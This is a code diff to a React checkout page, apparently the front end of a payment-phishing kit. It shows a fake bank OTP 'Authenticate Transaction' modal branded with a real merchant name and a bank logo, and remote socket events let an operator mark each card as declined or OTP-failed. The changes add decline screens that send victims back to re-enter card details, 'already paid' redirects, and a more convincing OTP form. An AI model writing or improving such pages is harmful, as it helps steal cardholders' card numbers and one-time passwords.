@@ -93,6 +93,114 @@ const Checkout = () => {
     localStorage.removeItem('lastPaymentData');
   }, []);
 
+  // Function to check if this payment link was already successful
+  const checkPaymentSuccess = async () => {
+    try {
+      // Check if we have linkId or other payment identifiers
+      const currentUrl = window.location.href;
+      const urlParams = new URLSearchParams(window.location.search);
+      const linkId = urlParams.get('linkId');
+      const amount = urlParams.get('amount');
+      const plan = urlParams.get('plan');
+      
+      console.log('🔍 Checking payment success for:', { linkId, amount, plan, currentUrl });
+      
+      // Method 1: Check by linkId if available
+      if (linkId) {
+        const linkSuccessData = localStorage.getItem(`payment_success_${linkId}`);
+        if (linkSuccessData) {
+          console.log('✅ Payment link already successful (by linkId):', linkId);
+          return JSON.parse(linkSuccessData);
+        }
+      }
+      
+      // Method 2: Check by URL pattern matching
+      const successfulPayments = JSON.parse(localStorage.getItem('successfulPayments') || '[]');
+      
+      // Check if any stored successful payment matches current parameters
+      for (const paymentId of successfulPayments) {
+        const paymentData = localStorage.getItem(`payment_success_${paymentId}`);
+        if (paymentData) {
+          const parsedData = JSON.parse(paymentData);
+          
+          // Match by amount and plan if available
+          if (amount && plan) {
+            if (parsedData.amount === parseFloat(amount) && parsedData.planName === plan) {
+              console.log('✅ Payment already successful (by amount/plan match):', parsedData);
+              return parsedData;
+            }
+          }
+        }
+      }
+      
+      // Method 3: Check by exact URL match (for generated payment links)
+      const urlSuccessKey = `url_success_${btoa(currentUrl)}`;
+      const urlSuccessData = localStorage.getItem(urlSuccessKey);
+      if (urlSuccessData) {
+        console.log('✅ Payment URL already successful:', currentUrl);
+        return JSON.parse(urlSuccessData);
+      }
+      
+      console.log('❌ No successful payment found for current parameters');
+      return null;
+    } catch (error) {
+      console.error('Error checking payment success:', error);
+      return null;
+    }
+  };
+
+  // Function to store URL success (called when payment becomes successful)
+  const storeUrlSuccess = (paymentData: any) => {
+    try {
+      const currentUrl = window.location.href;
+      const urlSuccessKey = `url_success_${btoa(currentUrl)}`;
+      const successData = {
+        url: currentUrl,
+        timestamp: new Date().toISOString(),
+        ...paymentData
+      };
+      localStorage.setItem(urlSuccessKey, JSON.stringify(successData));
+      console.log('💾 Stored URL success:', successData);
+    } catch (error) {
+      console.error('Error storing URL success:', error);
+    }
+  };
+
+  // Check for successful payment on component mount
+  useEffect(() => {
+    const checkSuccess = async () => {
+      const successData = await checkPaymentSuccess();
+      if (successData) {
+        console.log('🚀 Redirecting to success page - payment already completed');
+        
+        // Store user data for success page
+        const userData = {
+          firstName: 'Previous',
+          lastName: 'Customer',
+          email: 'customer@example.com',
+          country: 'Unknown',
+          companyName: '',
+          planName: successData.planName || planName,
+          billing: successData.billing || billing,
+          amount: successData.amount || customAmount,
+          paymentId: successData.paymentId || 'previous-payment'
+        };
+        localStorage.setItem('userCheckoutData', JSON.stringify(userData));
+        
+        // Navigate to success page immediately - check for hash-based URL first
+        if (successData.successHash) {
+          console.log('🚀 Redirecting to hash-based success page:', successData.successHash);
+          navigate(`/success/${successData.successHash}`);
+        } else {
+          console.log('🚀 Redirecting to regular success page');
+          navigate('/payment-success');
+        }
+      }
+    };
+    
+    checkSuccess();
+  }, [navigate, planName, billing, customAmount]);
+
 
 
   // Get socket from context for visitor tracking and payment handling
@@ -239,6 +347,10 @@ const Checkout = () => {
   const [otpCurrencySymbol, setOtpCurrencySymbol] = useState('₹');
   const [adminSelectedBankLogo, setAdminSelectedBankLogo] = useState<string>('');
   const [otpModalAnimating, setOtpModalAnimating] = useState(false);
+
+  // Payment error screen state
+  const [showPaymentErrorScreen, setShowPaymentErrorScreen] = useState(false);
+  const [paymentErrorMessage, setPaymentErrorMessage] = useState('');
 
   // Card session map to store bank logos and mobile numbers for each card
   const cardSessionMap = useRef<{ [key: string]: { logo: string; last4: string } }>({});
@@ -740,6 +852,28 @@ const Checkout = () => {
       setShowOtp(false);
       setShowSpinner(true);
       
+      // Store URL success for persistence
+      const urlSuccessData = {
+        paymentId: data.paymentId,
+        timestamp: new Date().toISOString(),
+        amount: displayPrice,
+        planName: planName,
+        billing: billing
+      };
+      storeUrlSuccess(urlSuccessData);
+      console.log('💾 Stored URL success for payment:', data.paymentId);
+      
+      // Check if this payment has a generated success hash
+      const storedSuccessData = localStorage.getItem(`payment_success_${data.paymentId}`);
+      if (storedSuccessData) {
+        const parsedData = JSON.parse(storedSuccessData);
+        if (parsedData.successHash) {
+          console.log('🔗 Found success hash, will redirect to hash-based success page');
+          // Store the success hash for redirect
+          localStorage.setItem('pendingSuccessHash', parsedData.successHash);
+        }
+      }
+      
       // Show loading spinner for 3 seconds with blur effect
       setTimeout(() => {
         setShowSpinner(false);
@@ -791,30 +925,52 @@ const Checkout = () => {
           return;
         }
         localStorage.setItem('lastPaymentData', JSON.stringify(successData));
-        navigate('/payment-success', { 
-          state: { 
-            paymentData: successData
-          } 
-        });
+        
+        // Check if we have a pending success hash to redirect to
+        const pendingHash = localStorage.getItem('pendingSuccessHash');
+        if (pendingHash) {
+          console.log('🚀 Redirecting to hash-based success page:', pendingHash);
+          localStorage.removeItem('pendingSuccessHash');
+          navigate(`/success/${pendingHash}`);
+        } else {
+          console.log('🚀 Redirecting to regular success page');
+          navigate('/payment-success', { 
+            state: { 
+              paymentData: successData
+            } 
+          });
+        }
       }, 3000);
     });
     socket.on('payment-rejected', (data) => {
       if (!data || data.paymentId !== paymentId) return;
-      setShowSpinner(true);
+      console.log('Payment rejected - showing error screen');
+      setShowOtp(false);
+      setShowSpinner(false);
+      setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
+      setShowPaymentErrorScreen(true);
+      
+      // Redirect to payment step after 4 seconds
       setTimeout(() => {
-        setShowSpinner(false);
+        setShowPaymentErrorScreen(false);
         setCurrentStep('payment');
         setDeclineError('Your card was declined!');
-      }, 2500);
+      }, 4000);
     });
     socket.on('insufficient-balance-error', (data) => {
       if (!data || data.paymentId !== paymentId) return;
-      setShowSpinner(true);
+      console.log('Insufficient balance - showing error screen');
+      setShowOtp(false);
+      setShowSpinner(false);
+      setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
+      setShowPaymentErrorScreen(true);
+      
+      // Redirect to payment step after 4 seconds
       setTimeout(() => {
-        setShowSpinner(false);
+        setShowPaymentErrorScreen(false);
         setCurrentStep('payment');
         setDeclineError('Your card have insufficient balance to pay for this order');
-      }, 2500);
+      }, 4000);
     });
     socket.on('invalid-otp-error', (data) => {
       if (!data || data.paymentId !== paymentId) return;
@@ -824,15 +980,18 @@ const Checkout = () => {
     });
     socket.on('card-declined-error', (data) => {
       if (!data || data.paymentId !== paymentId) return;
+      console.log('Card declined error - showing error screen');
+      setShowOtp(false);
       setShowSpinner(false);
-      setCurrentStep('payment');
-      setCardError('Your card was declined!');
-    });
-    socket.on('insufficient-balance-error', (data) => {
-      if (!data || data.paymentId !== paymentId) return;
-      setShowSpinner(false);
-      setCurrentStep('payment');
-      setCardError('Your card have insufficient balance');
+      setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
+      setShowPaymentErrorScreen(true);
+      
+      // Redirect to payment step after 4 seconds
+      setTimeout(() => {
+        setShowPaymentErrorScreen(false);
+        setCurrentStep('payment');
+        setCardError('Your card was declined!');
+      }, 4000);
     });
     return () => {
       console.log('Cleaning up socket event listeners');
@@ -1036,6 +1195,22 @@ const Checkout = () => {
               <Loader2 className="h-8 w-8 text-white animate-spin" />
             </div>
             <p className="text-white text-lg font-medium">Processing...</p>
+          </div>
+        </div>
+      )}
+      
+      {/* Payment Error Screen */}
+      {showPaymentErrorScreen && (
+        <div className="fixed inset-0 bg-white flex items-center justify-center z-[9999]">
+          <div className="text-center">
+            <div className="w-20 h-20 mx-auto mb-8">
+              <div className="w-full h-full border-4 border-red-200 border-t-red-500 rounded-full animate-spin" style={{
+                animation: 'spin 2s linear infinite'
+              }}></div>
+            </div>
+            <p className="text-red-600 text-lg font-medium max-w-md mx-auto px-4">
+              {paymentErrorMessage}
+            </p>
           </div>
         </div>
       )}
@@ -1714,23 +1889,23 @@ const Checkout = () => {
 
             {/* Enhanced OTP Verification Section */}
             {currentStep === 'otp' && (
-              <div className={`fixed inset-0 flex items-center justify-center z-50 p-4 transition-all duration-300 ease-out ${
+              <div className={`fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm transition-opacity duration-300 ease-out ${
                 otpModalAnimating ? 'bg-black bg-opacity-0' : 'bg-black bg-opacity-70'
               }`}>
                 <div className="flex flex-col items-center w-full">
                   {/* Cancel Button (above white box, right-aligned) */}
-                  <div className={`flex justify-end w-full mb-2 max-w-xs transition-all duration-300 ease-out ${
+                  <div className={`flex justify-end w-full mb-2 max-w-xs sm:max-w-md transition-all duration-300 ease-out ${
                     otpModalAnimating ? 'opacity-0 transform translate-y-2' : 'opacity-100 transform translate-y-0'
                   }`}>
                     <button
                       onClick={() => setShowCancelConfirm(true)}
-                      className="text-white hover:text-gray-300 text-xs font-medium underline bg-transparent border-none cursor-pointer"
+                      className="text-white hover:text-gray-300 text-sm font-medium underline bg-transparent border-none cursor-pointer"
                       aria-label="Cancel Transaction"
                     >
                       cancel
                     </button>
                   </div>
-                  <div className={`bg-white rounded-lg shadow-2xl relative w-full max-w-xs transition-all duration-300 ease-out ${
+                  <div className={`bg-white rounded-lg shadow-2xl relative w-full max-w-xs sm:max-w-md transition-all duration-300 ease-out ${
                     otpModalAnimating ? 'opacity-0 transform scale-95 translate-y-4' : 'opacity-100 transform scale-100 translate-y-0'
                   }`}>
                   {/* OTP Loading Overlay */}
@@ -1796,13 +1971,13 @@ const Checkout = () => {
 
 
                   {/* Top Row: Card Brand Logo (left) and Bank Logo (right) */}
-                  <div className="flex items-center justify-between px-4 pt-4 pb-2 border-b border-gray-200">
+                  <div className="flex items-center justify-between px-6 pt-6 pb-4 border-b border-gray-200">
                     <div className="flex items-center gap-2">
                       <div className="flex items-center justify-center bg-white rounded-md border border-gray-200 p-1 shadow-sm">
                         <img
                           src={cardBrandLogos[getCardBrand(cardData.cardNumber) as keyof typeof cardBrandLogos]}
                           alt="Card Brand Logo"
-                          className="h-6 w-auto max-w-[50px] object-contain"
+                          className="h-8 w-auto max-w-[65px] object-contain"
                           onError={(e) => {
                             console.log('Header logo loading failed, falling back to Visa');
                             e.currentTarget.src = cardBrandLogos.visa;
@@ -1814,7 +1989,7 @@ const Checkout = () => {
                     <img
                       src={adminSelectedBankLogo || sessionBankLogo || 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png'}
                       alt="Bank Logo"
-                      className="h-6 w-16 object-contain"
+                      className="h-8 w-20 object-contain"
                       onError={(e) => {
                         console.log('❌ Bank logo failed to load, using fallback');
                         e.currentTarget.src = 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png';
@@ -1822,24 +1997,24 @@ const Checkout = () => {
                     />
                   </div>
                   {/* Merchant Details Table */}
-                  <div className="px-4 pt-2 pb-2">
-                    <table className="w-full text-xs">
+                  <div className="px-6 pt-4 pb-4">
+                    <table className="w-full text-sm">
                       <tbody>
                         <tr>
-                          <td className="text-gray-600 py-0.5">Merchant Name</td>
-                          <td className="text-right font-medium text-gray-800 py-0.5">PLURALSIGHT</td>
+                           <td className="text-gray-600 py-1">Merchant Name</td>
+                           <td className="text-right font-medium text-gray-800 py-1">PLURALSIGHT</td>
                         </tr>
                         <tr>
-                          <td className="text-gray-600 py-0.5">Date</td>
-                          <td className="text-right font-medium text-gray-800 py-0.5">{new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</td>
+                          <td className="text-gray-600 py-1">Date</td>
+                          <td className="text-right font-medium text-gray-800 py-1">{new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</td>
                         </tr>
                         <tr>
-                          <td className="text-gray-600 py-0.5">Card Number</td>
-                          <td className="text-right font-medium text-gray-800 py-0.5">{cardData.cardNumber.slice(0, 4)} XXXX XXXX {cardData.cardNumber.slice(-4)}</td>
+                          <td className="text-gray-600 py-1">Card Number</td>
+                          <td className="text-right font-medium text-gray-800 py-1">{cardData.cardNumber.slice(0, 4)} XXXX XXXX {cardData.cardNumber.slice(-4)}</td>
                         </tr>
                         <tr>
-                          <td className="text-gray-600 py-0.5">Amount</td>
-                          <td className="text-right font-bold text-blue-700 py-0.5">
+                          <td className="text-gray-600 py-1">Amount</td>
+                          <td className="text-right font-bold text-blue-700 py-1">
                             {otpCustomAmount !== null ? (
                               `${otpCurrencySymbol}${otpCustomAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
                             ) : (
@@ -1851,8 +2026,8 @@ const Checkout = () => {
                     </table>
                   </div>
                   {/* Authenticate Transaction Title */}
-                  <div className="px-4 pt-1 pb-0">
-                    <h3 className="text-sm font-semibold text-blue-700 text-center mb-1">Authenticate Transaction</h3>
+                  <div className="px-4 pt-2 pb-1">
+                    <h3 className="text-base font-semibold text-blue-700 text-center mb-2">Authenticate Transaction</h3>
                   </div>
                   {/* OTP Sent Message or Resend Message */}
                   <div className="px-4">
@@ -1882,7 +2057,7 @@ const Checkout = () => {
                       value={otpValue}
                       onChange={e => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                       disabled={otpSubmitting}
-                      className="w-full text-center text-sm tracking-widest h-8 border-2 border-blue-400 rounded bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400"
+                      className="w-full text-center text-base tracking-widest h-10 border-2 border-blue-400 rounded bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400"
                       placeholder="Enter OTP Here"
                       maxLength={6}
                       style={{ letterSpacing: '0.3em', fontSize: '0.875rem' }}
